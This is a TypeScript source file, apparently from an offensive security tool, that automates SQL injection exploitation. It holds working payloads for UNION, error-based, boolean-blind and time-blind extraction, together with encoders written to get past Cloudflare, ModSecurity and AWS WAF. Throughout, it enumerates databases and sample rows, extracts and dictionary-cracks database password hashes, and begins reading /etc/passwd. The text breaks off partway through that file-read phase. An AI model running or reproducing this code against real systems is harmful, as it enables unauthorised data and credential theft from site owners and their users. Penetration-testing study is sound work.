// InjectProof — Deep SQL Injection Exploitation Engine
// Multi-technique automated exploitation: UNION → Error → Boolean-blind → Time-blind
// Full DB enumeration, credential extraction, file read, OS command proof-of-concept
// Designed to surpass legacy tools with modern evasion and adaptive extraction

import { buildRequestString, buildResponseString } from '@/lib/utils';

// ============================================================
// TYPES
// ============================================================

export type DbmsFamily = 'mysql' | 'postgresql' | 'mssql' | 'oracle' | 'sqlite' | 'unknown';
export type ExploitTechnique = 'union-based' | 'error-based' | 'boolean-blind' | 'time-blind' | 'stacked';
export type InjectionPoint = 'query' | 'body' | 'header' | 'cookie' | 'path' | 'json' | 'multipart';

export interface ExploitStep {
    phase: string;
    payload: string;
    success: boolean;
    extracted?: string;
    error?: string;
}

export interface ColumnInfo {
    name: string;
    type: string;
    nullable?: boolean;
    key?: string;
}

export interface TableInfo {
    name: string;
    columns: ColumnInfo[];
    rowCount?: number;
    sampleRows: Record<string, unknown>[];
}

export interface DatabaseInfo {
    name: string;
    tables: TableInfo[];
}

export interface UserInfo {
    username: string;
    hostname?: string;
    privileges?: string[];
}

export interface PasswordHash {
    user: string;
    hash: string;
    cracked?: string;
}

export interface FileReadResult {
    path: string;
    content: string;
    success: boolean;
}

export interface OsCommandResult {
    command: string;
    output: string;
    success: boolean;
}

export interface TestedTechnique {
    technique: ExploitTechnique;
    success: boolean;
    payload?: string;
    evidence?: string;
}

export interface SqliExploitResult {
    dbms: string;
    dbmsFamily: DbmsFamily;
    dbmsVersion?: string;
    technique: ExploitTechnique;
    currentDatabase: string;
    currentUser: string;
    hostname: string;
    dataDir: string;
    columnCount: number;
    injectableColumn: number;
    isDbAdmin?: boolean;
    serverOs?: string;
    privileges?: string[];
    databases: DatabaseInfo[];
    users?: UserInfo[];
    passwordHashes?: PasswordHash[];
    filesRead?: FileReadResult[];
    osCommands?: OsCommandResult[];
    testedTechniques: TestedTechnique[];
    bannedTechniques?: ExploitTechnique[];
    exploitLog: ExploitStep[];
    startedAt: number;
    completedAt: number;
}

export interface DeepExploitConfig {
    requestTimeout: number;
    userAgent: string;
    customHeaders?: Record<string, string>;
    authHeaders?: Record<string, string>;
    maxDatabases?: number;
    maxTablesPerDb?: number;
    maxColumnsPerTable?: number;
    maxRowsPerTable?: number;
    wafType?: string;
    preferredTechnique?: ExploitTechnique;
}

// ============================================================
// DBMS FINGERPRINTING PATTERNS
// ============================================================

const DBMS_ERROR_PATTERNS: Array<{ pattern: RegExp; dbms: DbmsFamily }> = [
    { pattern: /SQL syntax.*MySQL/i, dbms: 'mysql' },
    { pattern: /Warning.*mysql_/i, dbms: 'mysql' },
    { pattern: /MySqlException/i, dbms: 'mysql' },
    { pattern: /You have an error in your SQL syntax/i, dbms: 'mysql' },
    { pattern: /valid MySQL result/i, dbms: 'mysql' },
    { pattern: /PostgreSQL.*ERROR/i, dbms: 'postgresql' },
    { pattern: /pg_query|pg_exec/i, dbms: 'postgresql' },
    { pattern: /PSQLException/i, dbms: 'postgresql' },
    { pattern: /unterminated quoted string/i, dbms: 'postgresql' },
    { pattern: /syntax error at or near/i, dbms: 'postgresql' },
    { pattern: /ORA-\d{5}/i, dbms: 'oracle' },
    { pattern: /Oracle.*Driver/i, dbms: 'oracle' },
    { pattern: /quoted string not properly terminated/i, dbms: 'oracle' },
    { pattern: /Microsoft.*ODBC.*SQL Server/i, dbms: 'mssql' },
    { pattern: /Unclosed quotation mark/i, dbms: 'mssql' },
    { pattern: /SQL Server.*Driver/i, dbms: 'mssql' },
    { pattern: /SQLSTATE\[\w+\]/i, dbms: 'unknown' },
    { pattern: /SQLite.*error/i, dbms: 'sqlite' },
    { pattern: /sqlite3\.OperationalError/i, dbms: 'sqlite' },
    { pattern: /JDBC.*Exception/i, dbms: 'unknown' },
    { pattern: /Hibernate.*Exception/i, dbms: 'unknown' },
];

// ============================================================
// COMMON PASSWORD DICTIONARY (top hashes for cracking)
// ============================================================

const COMMON_PASSWORDS: Record<string, string> = {
    // MD5
    '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
    'e10adc3949ba59abbe56e057f20f883e': '123456',
    'd8578edf8458ce06fbc5bb76a58c5ca4': 'qwerty',
    '827ccb0eea8a706c4c34a16891f84e7b': '12345',
    '25f9e794323b453885f5181f1b624d0b': '123456789',
    '96e79218965eb72c92a549dd5a330112': '111111',
    'e99a18c428cb38d5f260853678922e03': 'abc123',
    '25d55ad283aa400af464c76d713c07ad': '12345678',
    'd577273ff885c3f84dadb8578571571': 'letmein',
    '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8': 'password', // SHA256
    // SHA1
    '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8': 'password',
    '7c222fb2927d828af22f592134e8932480637c0d': '12345678',
    '8cb2237d0679ca88db6464eac60da96345513964': '12345',
    'f7c3bc1d808e04732adf679965ccc34ca7ae3441': '123456789',
    '7110eda4d09e062aa5e4a390b0a572ac0d2c0220': '1234',
    '40bd001563085fc35165329ea1ff5c5ecbdbbeef': '123',
    // MySQL native hash patterns
};

// ============================================================
// WAF EVASION ENCODERS
// ============================================================

interface WafEncoder {
    name: string;
    encode: (payload: string) => string;
}

const WAF_ENCODERS: Record<string, WafEncoder[]> = {
    cloudflare: [
        { name: 'inline-comment', encode: p => p.replace(/SELECT/gi, 'SE/*!50000LECT*/').replace(/UNION/gi, 'UN/*!50000ION*/').replace(/ /g, '/**/') },
        { name: 'hex-encode', encode: p => p.replace(/SELECT/gi, '0x53454c454354').replace(/UNION/gi, '0x554e494f4e') },
        { name: 'newline', encode: p => p.replace(/ /g, '%0a') },
    ],
    modsecurity: [
        { name: 'tab-space', encode: p => p.replace(/ /g, '\t') },
        { name: 'case-swap', encode: p => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
        { name: 'double-url', encode: p => encodeURIComponent(encodeURIComponent(p)) },
    ],
    aws_waf: [
        { name: 'json-unicode', encode: p => p.replace(/'/g, '\\u0027').replace(/ /g, '\\u0020') },
        { name: 'chunk-encode', encode: p => p.replace(/ /g, '%20') },
    ],
    default: [
        { name: 'plain', encode: p => p },
        { name: 'inline-comment', encode: p => p.replace(/SELECT/gi, 'SE/*!LECT*/').replace(/UNION/gi, 'UN/*!ION*/').replace(/ /g, '/**/') },
        { name: 'case-swap', encode: p => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
    ],
};

/**
 * Get evasion encoders based on detected WAF
 */
function getEncoders(wafType?: string): WafEncoder[] {
    if (wafType && WAF_ENCODERS[wafType]) {
        return [{ name: 'plain', encode: p => p }, ...WAF_ENCODERS[wafType]];
    }
    return WAF_ENCODERS.default;
}

// ============================================================
// HTTP REQUEST HELPER
// ============================================================

async function exploitRequest(
    url: string,
    method: string,
    paramName: string,
    paramType: InjectionPoint,
    payload: string,
    config: DeepExploitConfig,
): Promise<{ body: string; time: number } | null> {
    try {
        const headers: Record<string, string> = {
            'User-Agent': config.userAgent,
            ...config.customHeaders,
            ...config.authHeaders,
        };

        let fetchUrl = url;
        let fetchBody: string | undefined;

        if (paramType === 'query') {
            const u = new URL(url);
            u.searchParams.set(paramName, payload);
            fetchUrl = u.toString();
        } else {
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            fetchBody = `${paramName}=${encodeURIComponent(payload)}`;
        }

        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), config.requestTimeout);

        const response = await fetch(fetchUrl, {
            method,
            headers,
            body: fetchBody,
            signal: controller.signal,
            redirect: 'follow',
        });
        clearTimeout(timeoutId);

        const body = await response.text();
        return { body, time: Date.now() - startTime };
    } catch {
        return null;
    }
}

/**
 * Try request with WAF evasion — attempt plain first, then encoded variants
 */
async function evasiveRequest(
    url: string,
    method: string,
    paramName: string,
    paramType: InjectionPoint,
    payload: string,
    config: DeepExploitConfig,
): Promise<{ body: string; time: number; encoder: string } | null> {
    const encoders = getEncoders(config.wafType);
    for (const enc of encoders) {
        const encoded = enc.encode(payload);
        const res = await exploitRequest(url, method, paramName, paramType, encoded, config);
        if (res && res.body.length > 0) {
            return { ...res, encoder: enc.name };
        }
    }
    return null;
}

// ============================================================
// EXTRACTION STRATEGIES
// ============================================================

/**
 * Strategy 1: UNION-Based Extraction
 * Fast, returns data inline — works when response reflects query results
 */
function buildUnionPayload(expr: string, columnCount: number, injectableCol: number): string {
    const cols = Array(columnCount).fill('NULL');
    cols[injectableCol - 1] = expr;
    return `' UNION SELECT ${cols.join(',')}-- -`;
}

/**
 * Strategy 2: Error-Based Extraction
 * Uses DB error messages to leak data — works when errors are shown
 */
function buildErrorPayload(expr: string, dbms: DbmsFamily): string {
    switch (dbms) {
        case 'mysql':
            return `' AND ExtractValue(1, CONCAT(0x7e, (${expr}), 0x7e))-- -`;
        case 'mssql':
            return `' AND 1=CONVERT(int, (${expr}))-- -`;
        case 'postgresql':
            return `' AND 1=CAST((${expr}) AS integer)-- -`;
        case 'oracle':
            return `' AND 1=CTXSYS.DRITHSX.SN(1, (${expr}))-- -`;
        default:
            return `' AND 1=CAST((${expr}) AS integer)-- -`;
    }
}

/**
 * Strategy 3: Boolean-Blind Extraction (bit-by-bit)
 * Extracts one character at a time by comparing ASCII values
 */
async function extractBlindChar(
    url: string, method: string, paramName: string, paramType: InjectionPoint,
    expr: string, position: number, config: DeepExploitConfig,
    baselineLength: number,
): Promise<string> {
    // Binary search for ASCII code (32-126)
    let low = 32;
    let high = 126;

    while (low <= high) {
        const mid = Math.floor((low + high) / 2);
        const payload = `' AND ASCII(SUBSTRING((${expr}),${position},1))>${mid}-- -`;
        const res = await exploitRequest(url, method, paramName, paramType, payload, config);

        if (!res) return '';

        // Determine if condition was true (response matches "true" baseline)
        const isTrue = Math.abs(res.body.length - baselineLength) < 50;

        if (isTrue) {
            low = mid + 1;
        } else {
            high = mid - 1;
        }
    }

    return low >= 32 && low <= 126 ? String.fromCharCode(low) : '';
}

/**
 * Extract full string via boolean-blind (char by char)
 */
async function extractBlindString(
    url: string, method: string, paramName: string, paramType: InjectionPoint,
    expr: string, config: DeepExploitConfig,
    baselineLength: number, maxLen: number = 256,
): Promise<string> {
    let result = '';
    for (let i = 1; i <= maxLen; i++) {
        const ch = await extractBlindChar(url, method, paramName, paramType, expr, i, config, baselineLength);
        if (!ch || ch === '\0') break;
        result += ch;
    }
    return result;
}

/**
 * Strategy 4: Time-Blind Extraction (conditional delay)
 * Uses response timing — slowest but works on fully blind endpoints
 */
async function extractTimeBlindChar(
    url: string, method: string, paramName: string, paramType: InjectionPoint,
    expr: string, position: number, config: DeepExploitConfig,
    dbms: DbmsFamily,
): Promise<string> {
    let low = 32;
    let high = 126;
    const sleepFn = dbms === 'mysql' ? 'SLEEP(2)' : dbms === 'mssql' ? "WAITFOR DELAY '0:0:2'" : dbms === 'postgresql' ? 'pg_sleep(2)' : 'SLEEP(2)';

    while (low <= high) {
        const mid = Math.floor((low + high) / 2);
        const payload = `' AND IF(ASCII(SUBSTRING((${expr}),${position},1))>${mid},${sleepFn},0)-- -`;
        const res = await exploitRequest(url, method, paramName, paramType, payload, config);

        if (!res) return '';

        if (res.time > 1800) {
            low = mid + 1;
        } else {
            high = mid - 1;
        }
    }

    return low >= 32 && low <= 126 ? String.fromCharCode(low) : '';
}

/**
 * Extract full string via time-blind
 */
async function extractTimeBlindString(
    url: string, method: string, paramName: string, paramType: InjectionPoint,
    expr: string, config: DeepExploitConfig,
    dbms: DbmsFamily, maxLen: number = 128,
): Promise<string> {
    let result = '';
    for (let i = 1; i <= maxLen; i++) {
        const ch = await extractTimeBlindChar(url, method, paramName, paramType, expr, i, config, dbms);
        if (!ch || ch === '\0') break;
        result += ch;
    }
    return result;
}

// ============================================================
// MAIN: Deep SQLi Exploitation
// ============================================================

export async function deepExploitSqli(
    url: string,
    method: string,
    paramName: string,
    paramType: InjectionPoint | string,
    config: DeepExploitConfig,
): Promise<SqliExploitResult | null> {
    const log: ExploitStep[] = [];
    const testedTechniques: TestedTechnique[] = [];
    const bannedTechniques: ExploitTechnique[] = [];
    const startedAt = Date.now();
    const injPoint = paramType as InjectionPoint;

    const maxDbs = config.maxDatabases ?? 10;
    const maxTables = config.maxTablesPerDb ?? 20;
    const maxCols = config.maxColumnsPerTable ?? 30;
    const maxRows = config.maxRowsPerTable ?? 5;

    const addLog = (phase: string, payload: string, success: boolean, extracted?: string, error?: string) => {
        log.push({ phase, payload, success, extracted, error });
    };

    // Active technique tracker — will be set during detection
    let activeTechnique: ExploitTechnique = 'union-based';

    // ── Phase 1: DBMS Fingerprinting ──────────────────────────
    let dbmsFamily: DbmsFamily = 'unknown';
    let dbms = 'Unknown';
    let dbmsVersion: string | undefined;

    addLog('init', '', true, `Starting deep exploitation on ${url}, param: ${paramName}`);

    // Error-based fingerprinting (fast)
    const fingerprints = [
        { payload: `' AND 1=CONVERT(int, @@version)-- -`, dbms: 'mssql' as DbmsFamily },
        { payload: `' AND ExtractValue(1, CONCAT(0x7e, VERSION()))-- -`, dbms: 'mysql' as DbmsFamily },
        { payload: `' AND 1=CAST(version() AS integer)-- -`, dbms: 'postgresql' as DbmsFamily },
        { payload: `' AND 1=CAST((SELECT sqlite_version()) AS integer)-- -`, dbms: 'sqlite' as DbmsFamily },
    ];

    for (const fp of fingerprints) {
        const res = await evasiveRequest(url, method, paramName, injPoint, fp.payload, config);
        if (res) {
            const match = DBMS_ERROR_PATTERNS.find(p => p.pattern.test(res.body));
            if (match) {
                dbmsFamily = match.dbms;
                dbms = match.dbms.charAt(0).toUpperCase() + match.dbms.slice(1);
                addLog('fingerprint', fp.payload, true, `DBMS identified: ${dbms}`);
                testedTechniques.push({ technique: 'error-based', success: true, payload: fp.payload, evidence: `Pattern: ${match.pattern}` });
                break;
            }
            // Check for version string in response
            const verMatch = res.body.match(/(\d+\.\d+[\.\d]*)/);
            if (verMatch && fp.dbms !== 'unknown') {
                dbmsFamily = fp.dbms;
                dbms = fp.dbms.charAt(0).toUpperCase() + fp.dbms.slice(1);
                dbmsVersion = verMatch[1];
                addLog('fingerprint', fp.payload, true, `DBMS: ${dbms} v${dbmsVersion}`);
                testedTechniques.push({ technique: 'error-based', success: true, payload: fp.payload });
                break;
            }
        }
        addLog('fingerprint', fp.payload, false);
    }

    // Time-based fingerprinting fallback
    if (dbmsFamily === 'unknown') {
        const timePayloads = [
            { payload: `' OR SLEEP(3)-- -`, dbms: 'mysql' as DbmsFamily },
            { payload: `'; WAITFOR DELAY '0:0:3'-- -`, dbms: 'mssql' as DbmsFamily },
            { payload: `' OR pg_sleep(3)-- -`, dbms: 'postgresql' as DbmsFamily },
        ];
        for (const tp of timePayloads) {
            const res = await exploitRequest(url, method, paramName, injPoint, tp.payload, config);
            if (res && res.time > 2500) {
                dbmsFamily = tp.dbms;
                dbms = tp.dbms.charAt(0).toUpperCase() + tp.dbms.slice(1);
                addLog('fingerprint', tp.payload, true, `DBMS (via timing): ${dbms}, delay: ${res.time}ms`);
                testedTechniques.push({ technique: 'time-blind', success: true, payload: tp.payload });
                activeTechnique = 'time-blind';
                break;
            }
            addLog('fingerprint', tp.payload, false);
        }
    }

    // ── Phase 2: Column Count Detection (Binary Search) ───────
    let columnCount = 0;

    // Binary search for column count (faster than linear)
    let lo = 1;
    let hi = 30;
    while (lo <= hi) {
        const mid = Math.floor((lo + hi) / 2);
        const payload = `' ORDER BY ${mid}-- -`;
        const res = await exploitRequest(url, method, paramName, injPoint, payload, config);
        if (!res) { lo = mid + 1; continue; }

        const hasError = DBMS_ERROR_PATTERNS.some(p => p.pattern.test(res.body))
            || /Unknown column/i.test(res.body)
            || /ORDER BY.*out of range/i.test(res.body)
            || /ORDER BY position.*is not in select list/i.test(res.body);

        if (hasError) {
            hi = mid - 1;
        } else {
            columnCount = mid;
            lo = mid + 1;
        }
    }

    if (columnCount === 0) columnCount = 3; // fallback
    addLog('column-count', `ORDER BY (binary search)`, true, `Columns: ${columnCount}`);

    // ── Phase 3: Find Injectable Column + Determine Best Technique ──
    let injectableColumn = 1;
    let unionWorks = false;
    let errorExtractWorks = false;
    let booleanBlindWorks = false;
    let blindBaseline = 0;

    // Test UNION-based first (fastest for extraction)
    const nulls = Array(columnCount).fill('NULL');
    for (let i = 0; i < columnCount; i++) {
        const testNulls = [...nulls];
        testNulls[i] = "'IPF_CANARY_7x3'";
        const payload = `' UNION SELECT ${testNulls.join(',')}-- -`;
        const res = await evasiveRequest(url, method, paramName, injPoint, payload, config);
        if (res && res.body.includes('IPF_CANARY_7x3')) {
            injectableColumn = i + 1;
            unionWorks = true;
            activeTechnique = 'union-based';
            addLog('technique-test', payload, true, `UNION works. Injectable column: #${injectableColumn}`);
            testedTechniques.push({ technique: 'union-based', success: true, payload });
            break;
        }
    }

    // Test Error-based extraction
    if (!unionWorks) {
        const errTestExpr = dbmsFamily === 'mysql'
            ? `ExtractValue(1, CONCAT(0x7e, 'IPF_ERR_OK', 0x7e))`
            : `CAST('IPF_ERR_OK' AS integer)`;
        const errPayload = `' AND ${errTestExpr}-- -`;
        const errRes = await evasiveRequest(url, method, paramName, injPoint, errPayload, config);
        if (errRes && errRes.body.includes('IPF_ERR_OK')) {
            errorExtractWorks = true;
            activeTechnique = 'error-based';
            addLog('technique-test', errPayload, true, 'Error-based extraction works');
            testedTechniques.push({ technique: 'error-based', success: true, payload: errPayload });
        } else {
            testedTechniques.push({ technique: 'error-based', success: false, payload: errPayload });
        }
    }

    // Test Boolean-blind
    if (!unionWorks && !errorExtractWorks) {
        const truePayload = `' AND 1=1-- -`;
        const falsePayload = `' AND 1=2-- -`;
        const trueRes = await exploitRequest(url, method, paramName, injPoint, truePayload, config);
        const falseRes = await exploitRequest(url, method, paramName, injPoint, falsePayload, config);

        if (trueRes && falseRes && Math.abs(trueRes.body.length - falseRes.body.length) > 20) {
            booleanBlindWorks = true;
            blindBaseline = trueRes.body.length;
            activeTechnique = 'boolean-blind';
            addLog('technique-test', truePayload, true, `Boolean-blind works. Δ=${Math.abs(trueRes.body.length - falseRes.body.length)} chars`);
            testedTechniques.push({ technique: 'boolean-blind', success: true, payload: truePayload });
        } else {
            testedTechniques.push({ technique: 'boolean-blind', success: false });
            // Fall back to time-blind (already tested during fingerprint)
            if (testedTechniques.some(t => t.technique === 'time-blind' && t.success)) {
                activeTechnique = 'time-blind';
            }
        }
    }

    addLog('technique', '', true, `Active technique: ${activeTechnique}`);

    // ── Universal Extract Function ────────────────────────────
    // Tries techniques in order: UNION → Error → Boolean → Time
    const extractExpr = async (expr: string, label: string, maxLen: number = 256): Promise<string> => {
        // 1. UNION-based (fastest)
        if (unionWorks) {
            const cols = Array(columnCount).fill('NULL');
            const marker = `IPX_${Math.random().toString(36).slice(2, 6)}`;
            cols[injectableColumn - 1] = `CONCAT('${marker}_',${expr})`;
            const payload = `' UNION SELECT ${cols.join(',')}-- -`;
            const res = await evasiveRequest(url, method, paramName, injPoint, payload, config);
            if (res && res.body.includes(`${marker}_`)) {
                const idx = res.body.indexOf(`${marker}_`);
                const raw = res.body.substring(idx + marker.length + 1, idx + marker.length + 1 + 2000);
                const value = raw.replace(/<[^>]+>/g, '').trim().split(/[\s<"']/)[0] || '';
                addLog(label, payload, true, value);
                return value;
            }
        }

        // 2. Error-based
        if (errorExtractWorks) {
            const payload = buildErrorPayload(expr, dbmsFamily);
            const res = await evasiveRequest(url, method, paramName, injPoint, payload, config);
            if (res) {
                // Extract from error message (look for value between tildes or in error text)
                const tildeMatch = res.body.match(/~([^~]+)~/);
                if (tildeMatch) {
                    addLog(label, payload, true, tildeMatch[1]);
                    return tildeMatch[1];
                }
                // MSSQL CONVERT error leak
                const convertMatch = res.body.match(/Conversion failed when converting.*?'([^']+)'/i);
                if (convertMatch) {
                    addLog(label, payload, true, convertMatch[1]);
                    return convertMatch[1];
                }
                // PostgreSQL CAST error leak
                const castMatch = res.body.match(/invalid input syntax.*?"([^"]+)"/i);
                if (castMatch) {
                    addLog(label, payload, true, castMatch[1]);
                    return castMatch[1];
                }
            }
        }

        // 3. Boolean-blind (slow)
        if (booleanBlindWorks) {
            const value = await extractBlindString(url, method, paramName, injPoint, expr, config, blindBaseline, Math.min(maxLen, 128));
            if (value) {
                addLog(label, `BLIND:${expr}`, true, value);
                return value;
            }
        }

        // 4. Time-blind (slowest)
        if (activeTechnique === 'time-blind') {
            const value = await extractTimeBlindString(url, method, paramName, injPoint, expr, config, dbmsFamily, Math.min(maxLen, 64));
            if (value) {
                addLog(label, `TBLIND:${expr}`, true, value);
                return value;
            }
        }

        addLog(label, expr, false, 'All extraction techniques failed');
        return '';
    };

    // ── Phase 4: Server Information ───────────────────────────
    let currentDatabase = '';
    let currentUser = '';
    let hostname = '';
    let dataDir = '';
    let serverOs: string | undefined;
    let isDbAdmin: boolean | undefined;

    const serverQueries = dbmsFamily === 'mysql' ? [
        { expr: `database()`, name: 'database' },
        { expr: `current_user()`, name: 'user' },
        { expr: `@@hostname`, name: 'hostname' },
        { expr: `@@datadir`, name: 'datadir' },
        { expr: `@@version_compile_os`, name: 'os' },
        { expr: `VERSION()`, name: 'version' },
    ] : dbmsFamily === 'postgresql' ? [
        { expr: `current_database()`, name: 'database' },
        { expr: `current_user`, name: 'user' },
        { expr: `inet_server_addr()::text`, name: 'hostname' },
        { expr: `current_setting('data_directory')`, name: 'datadir' },
        { expr: `version()`, name: 'version' },
    ] : dbmsFamily === 'mssql' ? [
        { expr: `DB_NAME()`, name: 'database' },
        { expr: `SYSTEM_USER`, name: 'user' },
        { expr: `@@SERVERNAME`, name: 'hostname' },
        { expr: `SERVERPROPERTY('InstanceDefaultDataPath')`, name: 'datadir' },
        { expr: `@@VERSION`, name: 'version' },
    ] : [
        { expr: `'main'`, name: 'database' },
    ];

    for (const q of serverQueries) {
        const value = await extractExpr(q.expr, `server-${q.name}`);
        if (value) {
            if (q.name === 'database') currentDatabase = value;
            else if (q.name === 'user') currentUser = value;
            else if (q.name === 'hostname') hostname = value;
            else if (q.name === 'datadir') dataDir = value;
            else if (q.name === 'os') serverOs = value;
            else if (q.name === 'version') { dbmsVersion = value; if (!serverOs) { serverOs = value; } }
        }
    }

    // Check if current user is DBA
    if (dbmsFamily === 'mysql') {
        const superPriv = await extractExpr(`(SELECT IF(super_priv='Y','DBA_YES','DBA_NO') FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1) LIMIT 1)`, 'admin-check');
        isDbAdmin = superPriv.includes('DBA_YES');
    } else if (dbmsFamily === 'postgresql') {
        const superCheck = await extractExpr(`(SELECT CASE WHEN usesuper THEN 'DBA_YES' ELSE 'DBA_NO' END FROM pg_user WHERE usename=current_user)`, 'admin-check');
        isDbAdmin = superCheck.includes('DBA_YES');
    } else if (dbmsFamily === 'mssql') {
        const saCheck = await extractExpr(`(SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'DBA_YES' ELSE 'DBA_NO' END)`, 'admin-check');
        isDbAdmin = saCheck.includes('DBA_YES');
    }

    // ── Phase 5: Database Enumeration ─────────────────────────
    const databases: DatabaseInfo[] = [];

    const dbQuery = dbmsFamily === 'mysql'
        ? `GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata`
        : dbmsFamily === 'postgresql'
            ? `string_agg(datname,',') FROM pg_database WHERE datistemplate=false`
            : dbmsFamily === 'mssql'
                ? `STRING_AGG(name,',') FROM sys.databases`
                : `'main'`;

    const dbNamesRaw = await extractExpr(dbQuery, 'enum-databases');
    let dbNames: string[] = [];

    if (dbNamesRaw) {
        dbNames = dbNamesRaw.split(',').filter(Boolean).slice(0, maxDbs);
        addLog('enum-databases', '', true, `Found ${dbNames.length} databases: ${dbNames.join(', ')}`);
    } else if (currentDatabase) {
        dbNames = [currentDatabase];
        addLog('enum-databases', '', true, `Fallback to current DB: ${currentDatabase}`);
    }

    // ── Phase 6: Tables + Columns + Data ──────────────────────
    for (const dbName of dbNames) {
        const db: DatabaseInfo = { name: dbName, tables: [] };

        // Get table list
        const tblQuery = dbmsFamily === 'mysql'
            ? `GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${dbName}' AND table_type='BASE TABLE'`
            : dbmsFamily === 'postgresql'
                ? `string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'`
                : dbmsFamily === 'mssql'
                    ? `STRING_AGG(name,',') FROM ${dbName}.sys.tables`
                    : `group_concat(name) FROM sqlite_master WHERE type='table'`;

        const tableNamesRaw = await extractExpr(tblQuery, `tables-${dbName}`);
        const tableNames = tableNamesRaw ? tableNamesRaw.split(',').filter(Boolean).slice(0, maxTables) : [];

        // Get columns + sample data for each table
        for (const tblName of tableNames) {
            const tbl: TableInfo = { name: tblName, columns: [], sampleRows: [] };

            // Columns
            const colQuery = dbmsFamily === 'mysql'
                ? `GROUP_CONCAT(column_name,'::',column_type SEPARATOR '||') FROM information_schema.columns WHERE table_schema='${dbName}' AND table_name='${tblName}'`
                : dbmsFamily === 'postgresql'
                    ? `string_agg(column_name||'::'||data_type,'||') FROM information_schema.columns WHERE table_name='${tblName}'`
                    : dbmsFamily === 'mssql'
                        ? `STRING_AGG(c.name+'::'+t.name,'||') FROM ${dbName}.sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID('${dbName}..${tblName}')`
                        : `group_concat(name||'::text','||') FROM pragma_table_info('${tblName}')`;

            const colsRaw = await extractExpr(colQuery, `cols-${tblName}`);
            if (colsRaw) {
                const cols = colsRaw.split('||').filter(Boolean).slice(0, maxCols);
                tbl.columns = cols.map(c => {
                    const [name, type] = c.split('::');
                    return { name: name || c, type: type || 'unknown' };
                });
            }

            // Sample rows (batch extraction via GROUP_CONCAT)
            if (tbl.columns.length > 0) {
                const colNames = tbl.columns.slice(0, 5).map(c => c.name);
                const concatExpr = dbmsFamily === 'mysql'
                    ? `GROUP_CONCAT(${colNames.map(c => `IFNULL(${c},'NULL')`).join(`,'|||',`)} SEPARATOR '###')`
                    : dbmsFamily === 'postgresql'
                        ? `string_agg(${colNames.map(c => `COALESCE(${c}::text,'NULL')`).join(`||'|||'||`)},'###')`
                        : `${colNames.join(',')}`;

                const selectFrom = dbmsFamily === 'mysql'
                    ? `${concatExpr} FROM ${dbName}.${tblName} LIMIT ${maxRows}`
                    : dbmsFamily === 'postgresql'
                        ? `${concatExpr} FROM ${tblName} LIMIT ${maxRows}`
                        : `TOP ${maxRows} ${concatExpr} FROM ${dbName}..${tblName}`;

                const rowsRaw = await extractExpr(selectFrom, `rows-${tblName}`);
                if (rowsRaw) {
                    const rows = rowsRaw.split('###').filter(Boolean).slice(0, maxRows);
                    tbl.sampleRows = rows.map(row => {
                        const vals = row.split('|||');
                        const obj: Record<string, unknown> = {};
                        colNames.forEach((col, i) => { obj[col] = vals[i] || ''; });
                        return obj;
                    });
                    tbl.rowCount = tbl.sampleRows.length;
                }
            }

            db.tables.push(tbl);
        }

        databases.push(db);
    }

    // ── Phase 7: User & Privilege Enumeration ─────────────────
    let users: UserInfo[] | undefined;
    let passwordHashes: PasswordHash[] | undefined;

    if (dbmsFamily === 'mysql') {
        const usersRaw = await extractExpr(
            `GROUP_CONCAT(user,'@',host SEPARATOR '||') FROM mysql.user`, 'enum-users',
        );
        if (usersRaw) {
            users = usersRaw.split('||').filter(Boolean).map(u => {
                const [username, hostname] = u.split('@');
                return { username, hostname };
            });

            // Extract password hashes
            const hashesRaw = await extractExpr(
                `GROUP_CONCAT(user,'::',IFNULL(authentication_string, password) SEPARATOR '||') FROM mysql.user`, 'enum-hashes',
            );
            if (hashesRaw) {
                passwordHashes = hashesRaw.split('||').filter(Boolean).map(h => {
                    const [user, hash] = h.split('::');
                    const cracked = COMMON_PASSWORDS[hash?.toLowerCase()] || undefined;
                    return { user, hash: hash || '', cracked };
                });
            }
        }
    } else if (dbmsFamily === 'postgresql') {
        const usersRaw = await extractExpr(
            `string_agg(usename,'||') FROM pg_user`, 'enum-users',
        );
        if (usersRaw) {
            users = usersRaw.split('||').filter(Boolean).map(u => ({ username: u }));

            // PostgreSQL shadow hashes
            const hashesRaw = await extractExpr(
                `string_agg(usename||'::'||passwd,'||') FROM pg_shadow`, 'enum-hashes',
            );
            if (hashesRaw) {
                passwordHashes = hashesRaw.split('||').filter(Boolean).map(h => {
                    const [user, hash] = h.split('::');
                    const cracked = COMMON_PASSWORDS[hash?.replace(/^md5/, '')?.toLowerCase()] || undefined;
                    return { user, hash: hash || '', cracked };
                });
            }
        }
    } else if (dbmsFamily === 'mssql') {
        const usersRaw = await extractExpr(
            `STRING_AGG(name,'||') FROM sys.server_principals WHERE type IN ('S','U')`, 'enum-users',
        );
        if (usersRaw) {
            users = usersRaw.split('||').filter(Boolean).map(u => ({ username: u }));

            const hashesRaw = await extractExpr(
                `STRING_AGG(name+'::'+CONVERT(varchar(max), password_hash, 1),'||') FROM sys.sql_logins`, 'enum-hashes',
            );
            if (hashesRaw) {
                passwordHashes = hashesRaw.split('||').filter(Boolean).map(h => {
                    const [user, hash] = h.split('::');
                    return { user, hash: hash || '' };
                });
            }
        }
    }

    // ── Phase 8: File Read (safe paths only) ──────────────────
    let filesRead: FileReadResult[] | undefined;

    const safeFilePaths = dbmsFamily === 'mysql'
        ? ['/etc/passwd', '/etc/hostname', 'C:\\Windows\\System32\\drivers\\etc\\hosts']
        : dbmsFamily === 'mssql'
            ? ['C:\\Windows\\System32\\drivers\\etc\\hosts']
            : dbmsFamily === 'postgresql'
                ? ['/etc/passwd', '/etc/hostname']
                : [];

    if (safeFilePaths.length > 0) {
        filesRead = [];
        for (const filePath of safeFilePaths) {
            let content = '';
            if (dbmsFamily === 'mysql') {
